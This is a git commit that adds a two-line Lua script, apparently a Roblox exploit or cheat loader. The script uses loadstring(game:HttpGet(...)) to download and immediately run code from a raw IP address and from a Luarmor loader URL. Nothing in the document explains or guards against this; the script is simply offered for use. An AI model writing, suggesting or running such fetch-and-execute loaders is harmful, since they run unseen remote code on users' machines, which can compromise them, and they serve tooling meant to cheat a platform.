b7f94d81d2f1efde193bf9422bbc08d62bf57791
swapper <zxchokagelol123@gmail.com>
2026-01-07 01:43:38 +0300

    Create script.lua

---
+++ script.lua
@@ -0,0 +1,2 @@
+ID="0a92de0c-a50f-454a-878f-16fc55c470d7";
+loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))() loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/c29af06acdb7a80fb239415fd322efe9.lua"))()
